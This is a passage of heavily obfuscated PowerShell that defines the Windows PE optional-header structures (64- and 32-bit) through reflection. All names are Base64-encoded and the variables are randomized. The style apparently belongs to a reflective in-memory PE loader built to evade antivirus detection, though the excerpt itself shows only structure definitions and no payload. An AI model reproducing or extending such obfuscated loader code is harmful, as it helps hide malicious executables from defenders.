		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${7f63c76797d2439f826fdb19fdcfd66e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${dd8e5e2bb1e341149d013fa6f029c84f}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(108) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(224) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(232) | Out-Null
		${9eb905891e0e4c50a403fc63e0170ba5} = ${55580d7c42de426c918d2e3e90cfdb71}.CreateType()
		${e39002e42e324234be4b9268daddc239} | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value ${9eb905891e0e4c50a403fc63e0170ba5}
		${c53158141dae4be9bd10d0c075d6d390} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${55580d7c42de426c918d2e3e90cfdb71} = ${ee2479f604eb42af9bd823448f5f2d6a}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIAMwAyAA=='))), ${c53158141dae4be9bd10d0c075d6d390}, [System.ValueType], 224)
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${53bb196677694558af8e39a2f19892c3}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(28) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${7f63c76797d2439f826fdb19fdcfd66e}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${dd8e5e2bb1e341149d013fa6f029c84f}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(76) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(84) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(92) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${55580d7c42de426c918d2e3e90cfdb71}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${62de2399b037479e8a6ddfda7a3c2f11}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
